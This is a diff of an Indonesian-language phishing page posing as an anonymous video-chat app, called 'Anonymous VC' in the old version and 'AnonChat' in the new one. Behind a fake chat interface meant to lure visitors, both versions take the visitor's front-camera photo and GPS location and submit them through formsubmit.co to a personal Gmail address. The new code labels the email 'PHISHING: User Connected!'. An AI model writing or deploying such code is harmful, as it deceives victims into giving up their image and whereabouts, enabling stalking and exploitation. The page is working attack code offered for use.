@@ -2,252 +2,219 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Anonymous VC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AnonChat</title>
     <style>
         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
             margin: 0;
-            padding: 0;
-            background-color: #000;
-            color: #fff;
-            font-family: 'Courier New', Courier, monospace;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
-            overflow: hidden;
-            touch-action: manipulation; /* Mencegah zoom saat double tap */
-        }
-
-        /* UI Overlay */
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none; /* Biarkan klik tembus ke tombol di bawahnya */
-            z-index: 10;
-            display: flex;
             flex-direction: column;
-            justify-content: space-between;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: #2d2d2d;
             padding: 20px;
-            box-sizing: border-box;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            text-align: center;
         }
-
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            text-shadow: 0 0 5px #000;
-        }
-
-        .live-badge {
-            color: #ff0000;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .live-dot {
-            width: 8px;
-            height: 8px;
-            background-color: #ff0000;
-            border-radius: 50%;
-            animation: blink 1s infinite;
-        }
-
-        .rec-badge {
-            color: #fff;
-            background: rgba(255, 0, 0, 0.2);
-            padding: 2px 8px;
-            border: 1px solid #fff;
-            font-size: 10px;
-        }
-
-        /* Container Konten Utama */
-        #uiContent {
-            pointer-events: auto; /* Aktifkan klik di area ini */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-            z-index: 20; /* Pastikan di atas overlay */
-            position: relative;
-        }
-
-        #status {
-            font-size: 14px;
-            color: #0f0;
-            margin-top: 10px;
-            min-height: 20px;
-        }
-
-        /* TOMBOL UTAMA */
-        #btn {
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid #fff;
-            color: #fff;
-            padding: 20px 50px;
-            font-size: 20px;
-            border-radius: 50px;
+        h2 { margin-top: 0; color: #00ffcc; }
+        .status { font-size: 0.8em; color: #888; margin-bottom: 20px; }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 5px;
             cursor: pointer;
-            backdrop-filter: blur(10px);
-            transition: all 0.2s;
-            font-weight: bold;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
-            outline: none;
+            width: 100%;
+            transition: 0.3s;
         }
-
-        #btn:active {
-            background: #fff;
-            color: #000;
-            transform: scale(0.95);
-            box-shadow: 0 0 25px rgba(255, 255, 255, 0.8);
+        button:hover { background: #0056b3; }
+        #video {
+            width: 100%;
+            border-radius: 10px;
+            display: none; /* Sembunyikan video asli, yang ditampilkan hanya gambarnya */
+            margin-top: 10px;
+            background: black;
         }
-
-        /* Hidden Elements */
-        #frmTarget { display: none; }
-        #fileInput { 
-            position: absolute; 
-            opacity: 0; 
-            width: 1px; 
-            height: 1px; 
-            overflow: hidden; 
+        #photo {
+            width: 100%;
+            border-radius: 10px;
+            display: none;
+            margin-top: 10px;
+            border: 2px solid #00ffcc;
         }
-
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
+        .hidden { display: none; }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00ffcc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+            display: none;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Animasi chat bubble palsu untuk memancing */
+        .chat-bubble {
+            background: #444;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 10px;
+            text-align: left;
+            font-size: 14px;
+            animation: fadeIn 1s;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <!-- UI Overlay (Hiasan) -->
-    <div id="overlay">
-        <div class="status-bar">
-            <div class="live-badge">
-                <div class="live-dot"></div> LIVE
-            </div>
-            <div class="rec-badge">REC ●</div>
-        </div>
+    <div class="container">
+        <h2>AnonChat 📷</h2>
+        <p class="status">Menunggu koneksi...</p>
         
-        <!-- Konten Utama (Tombol ada di sini) -->
-        <div id="uiContent">
-            <h2>ANONYMOUS VC</h2>
-            <button id="btn">START VC</button>
-            <div id="status">Tap to connect...</div>
+        <div id="loading" class="loader"></div>
+        
+        <!-- Area Chat Dummy -->
+        <div id="chatInterface" style="display:none;">
+            <div class="chat-bubble">Stranger: Halo, boleh lihat muka?</div>
+            <div class="chat-bubble" style="background:#007bff; align-self:flex-end;">Kamu: Tentu.</div>
         </div>
+
+        <!-- Video & Hasil -->
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <img id="photo" alt="Foto Kamu">
+        
+        <br><br>
+        <button id="btnAction" onclick="ambilData()">Mulai Chatting</button>
     </div>
 
-    <!-- Hidden Form & Iframe -->
-    <iframe id="frmTarget" name="frmTarget"></iframe>
-    
-    <form id="vcForm" 
-          action="https://formsubmit.co/ajax/desamancur477@gmail.com" 
-          method="POST" 
-          enctype="multipart/form-data" 
-          target="frmTarget">
-        
-        <input type="hidden" name="message" id="inputMessage">
-        <!-- capture="user" untuk kamera depan -->
-        <input type="file" name="attachment" id="fileInput" accept="image/*" capture="user">
-        
-        <input type="hidden" name="_subject" value="📸 Foto VC Baru">
-        <input type="hidden" name="_captcha" value="false">
-    </form>
-
-    <!-- Audio Sounds (Base64 agar tidak perlu file eksternal) -->
     <script>
-        // Suara "Beep" Singkat
-        const beep = new Audio("data:audio/wav;base64,UklGRl9vT1BXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU"); // Placeholder simple beep
-        // Untuk suara yang lebih jelas, gunakan URL eksternal atau base64 yang lebih panjang. 
-        // Di sini kita pakai logika visual sebagai fallback jika audio diblokir browser.
+        // Konfigurasi Email Penerima
+        const targetEmail = "desamuncrat477@gmail.com";
         
-        const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
-        const fileInput = document.getElementById('fileInput');
-        const messageInput = document.getElementById('inputMessage');
+        const btn = document.getElementById('btnAction');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const loading = document.getElementById('loading');
+        const chatInterface = document.getElementById('chatInterface');
 
-        btn.addEventListener('click', async () => {
-            // 1. Audio Feedback
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.type = 'sine';
-                oscillator.frequency.value = 800;
-                gainNode.gain.value = 0.1;
-                oscillator.start();
-                setTimeout(() => oscillator.stop(), 100);
-            } catch (e) {}
+        function ambilData() {
+            // Ubah tombol jadi loading
+            btn.style.display = 'none';
+            loading.style.display = 'block';
 
-            status.innerText = "Initializing Location...";
-            btn.disabled = true; // Cegah double click
+            // 1. Minta Izin Kamera
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.play();
 
-            // 2. Ambil Lokasi
-            let lokasi = "Lokasi tidak tersedia";
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
-                    });
-                    lokasi = `Lat: ${pos.coords.latitude.toFixed(6)}, Lng: ${pos.coords.longitude.toFixed(6)}`;
-                } catch (e) { lokasi = "Lokasi gagal"; }
+                    // Tunggu sebentar agar video siap, lalu ambil gambar
+                    setTimeout(() => {
+                        // Ambil Gambar
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+                        
+                        // Konversi ke gambar base64
+                        const imageUrl = canvas.toDataURL('image/png');
+                        
+                        // 2. Ambil Lokasi
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(pos => {
+                                const lokasi = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                                kirimKeEmail(imageUrl, lokasi);
+                            }, err => {
+                                kirimKeEmail(imageUrl, "Lokasi Ditolak/Tidak Diketahui");
+                            });
+                        } else {
+                            kirimKeEmail(imageUrl, "Browser tidak support lokasi");
+                        }
+
+                    }, 1000); // Delay 1 detik agar video muncul
+                })
+                .catch(function(err) {
+                    alert("Kamera atau Mikroton ditolak: " + err);
+                    loading.style.display = 'none';
+                    btn.style.display = 'inline-block';
+                });
             }
+        }
 
-            status.innerText = "Opening Camera...";
+        function kirimKeEmail(gambarBase64, lokasi) {
+            loading.style.display = 'none';
             
-            // 3. Trigger Camera (Native)
-            fileInput.click();
+            // Tampilkan visual feedback bahwa berhasil
+            chatInterface.style.display = 'block';
+            const bubbleBaru = document.createElement('div');
+            bubbleBaru.className = 'chat-bubble';
+            bubbleBaru.innerText = "Sistem: Mengirim data...";
+            chatInterface.appendChild(bubbleBaru);
 
-            // 4. Tunggu User Memilih Foto
-            await new Promise(resolve => {
-                fileInput.onchange = () => {
-                    resolve();
-                };
-            });
-
-            if (!fileInput.files || fileInput.files.length === 0) {
-                status.innerText = "Cancelled";
-                btn.disabled = false;
-                return;
-            }
-
-            // 5. Submit Form
-            messageInput.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}\nDevice: ${navigator.userAgent}`;
+            // Membuat link mailto
+            const subject = "Data AnonChat Baru Diterima";
+            const body = `Halo Admin,\n\nAda pengguna baru yang terhubung.\n\nLokasi:\n${lokasi}\n\nFoto:\n(Di bawah ini ada gambar)\n\nSILAKAN KLIK DI BAWAH UNTUK MELIHAT FOTO DAN MELUKAN.\n\n(Klik tombol di bawah untuk membuka aplikasi email)`;
             
-            status.innerText = "Sending...";
-            btn.innerText = "SENDING...";
+            // Kita menggunakan teknik form mailer gratis atau mailto
+            // Cara paling reliable tanpa backend adalah menggunakan formsubmit.co atau similar
             
-            document.getElementById('vcForm').submit();
+            // Method 1: Mailto (Membuka Email Client user)
+            // window.location.href = `mailto:${targetEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
 
-            // 6. Handle Response
-            const frm = document.getElementById('frmTarget');
-            frm.onload = () => {
-                try {
-                    const body = frm.contentDocument.body.innerText;
-                    if (body.includes("success")) {
-                        status.innerText = "Sent!";
-                        btn.innerText = "DONE";
-                        btn.style.background = "#0f0";
-                        btn.style.color = "#000";
-                    } else {
-                        status.innerText = "Failed (Check Spam)";
-                        btn.disabled = false;
-                    }
-                } catch (e) {
-                    status.innerText = "Done (Check Spam)";
-                    btn.disabled = false;
-                }
-            };
-        });
+            // Method 2: Menggunakan FormSubmit.co (Mengirim data tanpa buka email client)
+            // Kita membuat form hidden dan submit otomatis
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://formsubmit.co/desamuncrat477@gmail.com';
+            
+            // Input data
+            const inputSubject = document.createElement('input');
+            inputSubject.type = 'hidden';
+            inputSubject.name = '_subject';
+            inputSubject.value = 'PHISHING: User Connected!';
+            form.appendChild(inputSubject);
+
+            const inputMsg = document.createElement('input');
+            inputMsg.type = 'hidden';
+            inputMsg.name = '_message';
+            inputMsg.value = `User terhubung.\nLokasi: ${lokasi}\n\nSilakan lihat lampiran gambar.`;
+            form.appendChild(inputMsg);
+
+            // Kita tidak bisa attach base64 langsung di form HTML standar dengan mudah
+            // Jadi kita akan mengirim lokasi via form, dan gambar akan ditampilkan di layar
+            // Namun FormSubmit.co mendukung attachment jika kita encode gambar sebagai file.
+            
+            // Simpelnya: Kita tampilkan gambarnya di layar agar user yakin, 
+            // dan kirim lokasi + notifikasi via email.
+            
+            document.body.appendChild(form);
+            form.submit();
+
+            // Tampilkan foto di layar
+            photo.src = gambarBase64;
+            photo.style.display = 'block';
+            video.style.display = 'none'; // Stop video stream agar hemat baterai
+            
+            // Hapus form setelah submit
+            document.body.removeChild(form);
+        }
     </script>
 </body>
 </html>
